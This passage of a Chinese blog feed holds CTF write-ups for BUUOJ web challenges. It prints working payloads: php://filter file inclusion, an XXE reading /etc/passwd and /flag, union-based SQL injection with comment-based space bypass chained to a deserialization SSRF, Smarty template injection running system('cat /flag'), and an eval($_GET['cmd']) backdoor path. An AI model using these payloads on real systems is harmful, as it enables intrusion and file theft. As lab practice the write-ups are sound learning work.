class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Had a bad day?&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;</span><br><span class="line">          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line">      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;page-container mdl-grid&quot;&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;</span><br><span class="line">          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;h3&gt;Cheer up!&lt;/h3&gt;</span><br><span class="line">              &lt;p&gt;</span><br><span class="line">                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!</span><br><span class="line">              &lt;/p&gt;</span><br><span class="line">              &lt;div class=&quot;page-include&quot;&gt;</span><br><span class="line">              &lt;?php</span><br><span class="line">$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($file))//重点在这，如果category传参的内容没有woofers/meowers/index的话，不会include文件</span><br><span class="line">&#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">include ($file . &#x27;.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">          &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;</span><br><span class="line">              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">              &lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;</span><br><span class="line">          &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>重点就是传参的内容需要含有woofers或者meowers或者index，才能进行文件的包含，那这个就很简单了，直接加一个woofers/meowers/index到base64-encode后面去即可，payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//a10a5c5c-7c62-4cda-ad8d-b07dac49ea46.node4.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/meowers/resource=flag</span></span><br><span class="line">或者:</span><br><span class="line">http:<span class="comment">//a10a5c5c-7c62-4cda-ad8d-b07dac49ea46.node4.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span></span><br><span class="line">或者：</span><br><span class="line">http:<span class="comment">//a10a5c5c-7c62-4cda-ad8d-b07dac49ea46.node4.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/woofers/resource=flag</span></span><br></pre></td></tr></table></figure><p>获得base64，解码获得flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// flag&#123;f770d839-9c2a-47eb-9998-25958d168322&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="nctf-2019-fake-xml-cookbook"> [NCTF 2019] Fake XML cookbook</span></h2><p>又是我不会的新知识呢</p><p>XXE（XML External Entity Injection）</p><p>打开靶机，又是登录。。。</p><p>尝试弱口令和SQL注入，肯定是不行的</p><p>然后使用Burp抓包，发现了一段：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>加载了来自外部的实体，导致了可以加载外部文件，可以进行文件的读取</p><p>以及加上题目的提示 XML，应该可以执行XXE</p><p>一个经典的XXE组成如下（DTD外部实体声明）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>#xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>#DTD部分</span><br><span class="line">&lt;123&gt;<span class="symbol">&amp;asdf;</span>&lt;/123&gt;#xml部分</span><br></pre></td></tr></table></figure><p>所以直接通过burp抓包，然后使用XXE攻击即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功获得flag</p><img src="/2022/12/15/Buuoj%E9%A2%98%E7%9B%AE-2/1.png" class title="获取flag">]]></content>
    
    
    <summary type="html">&lt;p&gt;做做buuoj上的web题，本萌新纯采集，轻喷（（（&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web WriteUp" scheme="http://example.com/categories/CTF-Web-WriteUp/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Buuoj题目(1)</title>
    <link href="http://example.com/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/"/>
    <id>http://example.com/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/</id>
    <published>2022-12-09T02:44:14.000Z</published>
    <updated>2023-03-12T09:43:56.837Z</updated>
    
    <content type="html"><![CDATA[<p>做做buuoj上的web题，本萌新纯采集，轻喷（（（</p><span id="more"></span><h2><span id="网鼎杯-2018-fakebook"> [网鼎杯 2018] Fakebook</span></h2><p>SQL注入兼反序列化</p><p>点开靶机，一眼醒目的login和join，尝试login，那肯定是失败的</p><p>所以我们试试注册，填好个人信息之后点击提交，但是提示Blog is not valid.</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/1.png" class title="失败"><p>所以应该是博客地址的问题，应该是要一个确切的博客地址</p><p>所以这里把博客的地址都填上（只用填github.io的就可以了）</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/2.png" class title="成功"><p>然后观察url发现no=1</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/3.png" class title="发现no"><p>于是尝试no=1’</p><p>发现SQL报错了</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/4.png" class title="发现SQL注入"><p>于是进行SQL注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1&#x27;union select 1,2,3,4#</span><br></pre></td></tr></table></figure><p>回显 no hack <sub>_</sub>，说明过滤了关键词</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/5.png" class title="waf"><p>接下来就是测试关键词的时候</p><p>发现union 无no hack回显 union select 有no hack 回显</p><p>应该是过滤了空格</p><p>所以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1&#x27;union/**/select/**/1,2,3,4#</span><br></pre></td></tr></table></figure><p>发现报错，去掉单引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,2,3,4#</span><br></pre></td></tr></table></figure><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/6.png" class title="2号位回显正常"><p>发现2号位回显正常</p><p>然后上方有个notice: unserialize()</p><p>说明有反序列化的存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,database(),3,4#</span><br></pre></td></tr></table></figure><p>爆出库名 <strong>fakebook</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()#</span><br></pre></td></tr></table></figure><p>爆出表名 <strong>users</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure><p>爆出列名 <strong>no username passwd data</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,group_concat(data),3,4/**/from/**/users#</span><br></pre></td></tr></table></figure><p>发现了一串序列化的结果</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/7.png" class title="serializeResult"><p>然后似乎就做不下去了。。。</p><p>应该还有一些隐藏的文件吧，打开F12也没有提示</p><p>所以应该是存在敏感文件</p><p>打开dirsearch扫一下… 不过由于buuoj有反爬这个特性在，所以很难受的就是需要加上delay，使得扫描的过程十分的慢…</p><p>推荐盲试 robots.txt www.zip .bak啥的</p><p>在robots.txt发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure><p>直接访问/user.php.bak获得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">//curl_exec ssrf漏洞，请求协议</span></span><br><span class="line">        <span class="comment">//使用ssrf的file:///协议</span></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;<span class="comment">//返回内容</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)//获取博客内容</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们只需要序列化用file协议写出的flag位置，读入后使用curl就能够返回flag的内容了</p><p>flag应该在根目录，那么序列化如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>所以使用sql的语句写入内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;,3,4#</span><br></pre></td></tr></table></figure><p>如果没有内容，打开F12试试，如果也没有的话就换位置</p><p>测试3、4号位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,2,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;,4#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;#</span><br></pre></td></tr></table></figure><p>发现4号位回显正常，打开F12即可获取flag</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/8.png" class title="获得flag"><h2><span id="bjdctf2020-the-mystery-of-ip"> [BJDCTF2020] The mystery of ip</span></h2><p>smarty 模板注入</p><p>打开靶机</p><p>点击Flag，发现显示的是你的IP</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/9.png" class title="显示IP"><p>点击Hint，发现提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Do you know why i know your ip? --&gt;</span></span><br></pre></td></tr></table></figure><p>修改ip的话，应该是X-Forward-For的问题，所以我们使用burp抓包进行测试</p><p>修改X-Forward-For为127.0.0.1，显示为127.0.0.1</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/10.png" class title="修改xff"><p>试试修改为{7*7}，发现显示为49</p><p>应该就是ssti模板注入了，然后祭出经典老图</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/11.png" class title="注入模板"><p>其实也可以通过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;config&#125;</span><br></pre></td></tr></table></figure><p>查看哪个模板</p><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/12.png" class title="smarty"><p>所以是smarty的ssti注入</p><p>smarty的模板注入直接使用系统命令即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以使用</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">也可以直接使用</span><br><span class="line">&#123;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure><img src="/2022/12/09/Buuoj%E9%A2%98%E7%9B%AE-1/13.png" class title="获得flag"><p>获得flag</p><h2><span id="bjdctf2020zjctf不过如此"> [BJDCTF2020]ZJCTF，不过如此</span></h2><p>[ZJCTF2019]NiZhuanSiWei的复刻了属于是（雾）</p><p>直接看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样的写入，文件包含以及一个next.php</p><p>那我们直接data协议写入，php://filter文件包含即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span></span><br></pre></td></tr></table></figure><p>获得next.php内的base64代码，进行一个decode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经典再现：</p><p>指路Day 4: Baby match（每日一题）</p><p><font color="orange">preg_replace /e能够执行strolower(“\\1”)的内容</font></p><p>preg_replace输入的第一个是正则表达式<span class="katex"><span class="katex-mathml"><math 